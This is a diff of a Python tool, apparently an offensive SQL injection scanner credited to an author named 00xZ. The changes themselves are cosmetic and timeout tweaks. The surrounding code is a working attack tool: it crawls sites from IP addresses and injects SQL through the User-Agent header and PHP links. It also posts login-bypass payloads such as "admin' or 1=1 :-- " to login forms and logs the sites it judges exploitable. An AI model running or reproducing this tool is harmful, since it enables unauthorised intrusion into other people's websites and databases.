@@ -8,19 +8,21 @@ import re
 ### add user agent sqli and check all textbox vectors 
 def presentation():
 
-    print("[+] # #############################################")
-    print("[+] #                                             #")
-    print("[+] #          eye spy with my little eye a sqli  #")
-    print("[+] #      ~00xZ-       github.com/00xZ           #")
-    print("[+] #                                             #")
-    print("[+] # #############################################")
+    print("   ##############################################")
+    print("   #                                            #")
+    print("   #         eye spy with my little eye a sqli  #")
+    print("   #     ~00xZ-       github.com/00xZ           #")
+    print("   #                                            #")
+    print("   #  v2.1         Use: -h for help             #")
+    print("   #                                            #")
+    print("   ##############################################")
 
 def gethref(url, proxy):
     headers = {'User-Agent': "Mozilla/00xZ ' AND 1=1:--"}
     ur = (url)
-    print("\n[x] ~ SCAN: " + url + " ~ [x]")
+    print(" [x] ~ SCAN: " + url + " ~ [x]")
     try:
-        req = requests.get(ur, timeout=10, headers=headers, proxies=proxy)
+        req = requests.get(ur, timeout=6, headers=headers, proxies=proxy)
         soup = BeautifulSoup(req.text, 'html.parser')
         for link in soup.select('a[href*="php?"]'):
             okay = (link["href"])
@@ -29,7 +31,7 @@ def gethref(url, proxy):
             fo1.write(serv + "\n")
             fo1.close
             print("      [+] Sending payload " + serv)
-            reeqee = requests.get(serv, timeout=10, headers=headers, proxies=proxy)
+            reeqee = requests.get(serv, timeout=6, headers=headers, proxies=proxy)
             souper = BeautifulSoup(reeqee.text, "html.parser")
             if souper(text=lambda t: "SQL" in t):
                 print("\n [!] " + serv + " :  [!] Exploited [!] \n")
@@ -37,7 +39,7 @@ def gethref(url, proxy):
                 fo.write(serv + "\n")
                 fo.close
             else:
-                print("[x] Found SQLi Input but not exploitible [x] : " + serv )
+                print("   [x] Found SQLi Input but not exploitible [x] : " + serv )
                 pass 
     except:
         print("  [!] Timed out after timeout check maybe change timeout in script: " + ur)
@@ -61,7 +63,7 @@ def try_connect(url, USERS, PASSWORDS, title):
 		if titlenew != '<title>' + title + '</title>':
 			print(serv + " :  [!] LOGIN SQLI : VULN [!] " )
 		else:
-			print("[X] No User Input SQLi [X]")
+			print("   [X] No User Input SQLi [X]")
 			pass
 	except:
 		print("\n")
@@ -108,7 +110,7 @@ def loginsql(site, user_field, password_field, USERS, PASSWORDS, title, html_con
 			password_field: PASSWORDS.replace('\n', ''),
 		}
 		#print("[+] PAYLOAD:", payload)
-		r2 = requests.post(url, data=payload, timeout=10, headers=headers, proxies=proxy)
+		r2 = requests.post(url, data=payload, timeout=6, headers=headers, proxies=proxy)
 		soup = BeautifulSoup(r2.content, 'lxml')
 		titlenew = (soup.select_one('title').text)
 		titlez = (titlenew + " : " + title)
@@ -137,7 +139,7 @@ def title(url, proxy):
 	blacklist = ['*stackoverflow*', '*youtu*',  '*wikipedia*', '*microsoft*', '*centos*', '*google*', '*yahoo*', '*cloudflare*','*instagram*', '*facebook*' ,'*youtube*', '*twitter*','*tiktok*','*snapchat*','*gmail*','*amazon*', '*nginx*' ,'*bing*']
 	try:
 		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
-		rqt = requests.get(url, timeout=10, verify=True, headers=headers, proxies=proxy)
+		rqt = requests.get(url, timeout=6, verify=True, headers=headers, proxies=proxy)
 		soupr = BeautifulSoup(rqt.content, 'html.parser')
 		
 		for link in soupr.select('a[href*="http"]'):
@@ -145,17 +147,17 @@ def title(url, proxy):
 			site = str(site)
 			if any([fnmatch.fnmatch(site, filtering) for filtering in blacklist]):
 				continue
-			print("[!] Found Branch: " +site)
+			print(" [!] Found Branch: " +site)
 			if site not in sitelists:
 				try:
-					r = requests.get(site, timeout=10, verify=True, headers=headers, proxies=proxy)
+					r = requests.get(site, timeout=6, verify=True, headers=headers, proxies=proxy)
 					soup = BeautifulSoup(r.content, 'lxml')
 					title = (soup.select_one('title').text)
 					USERS = ("admin' or 1=1 :-- ")
 					PASSWORDS = ("1' or 1=1 -- -")
 					user_field = ("username")
 					password_field = ("password")
-					print("[+] Branched: " + url + " : " + title + "  [+]")
+					print("  [+] Branched: " + url + " : " + title + "  [+]")
 					kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
 					sitelists.append(site)
 					#print(sitelists)
@@ -170,14 +172,14 @@ def title(url, proxy):
 		pass
 	try:
 		headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
-		r = requests.get(url, timeout=10, verify=True, headers=headers, proxies=proxy)
+		r = requests.get(url, timeout=6, verify=True, headers=headers, proxies=proxy)
 		soup = BeautifulSoup(r.content, 'lxml')
 		title = (soup.select_one('title').text)
 		USERS = ("admin' or 1=1 :-- ")
 		PASSWORDS = ("1' or 1=1 -- -")
 		user_field = ("username")
 		password_field = ("password")
-		print(" [+] " + url + " : " + title + "  [+] ")
+		print("\n[+] " + url + " : " + title + "  [+] ")
 		kkk = open("servers.txt", "a").write(ip + " " + title + "\n")
 		loginsql(site, user_field, password_field, USERS, PASSWORDS , title, r.text, proxy)
 	except:
@@ -191,7 +193,7 @@ def whatitbe(ip, proxy):
 	#print(proxy)
 	headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
 	try:
-		reqeer = requests.post(url, timeout=10, headers=headers, proxies=proxy)
+		reqeer = requests.post(url, timeout=6, headers=headers, proxies=proxy)
 		title(url, proxy)
 	except:
 		print(" [!] Site Timed Out- "+url+" [!] ")
@@ -204,7 +206,7 @@ def whatitbe(ip, proxy):
 			proxy = {"https": "http://" +proxy}
 		#print(proxy)
 		url = ("https://" +ip+ "/")
-		reqeer = requests.post(url, timeout=10, headers=headers, proxies=proxy)
+		reqeer = requests.post(url, timeout=6, headers=headers, proxies=proxy)
 		title(url, proxy)
 	except:
 		print(" [!] Site(s) Timed Out- "+url+" [!] ")
@@ -248,3 +250,4 @@ def main():
 		print("Use -h for help")
 		pass
 main()
+
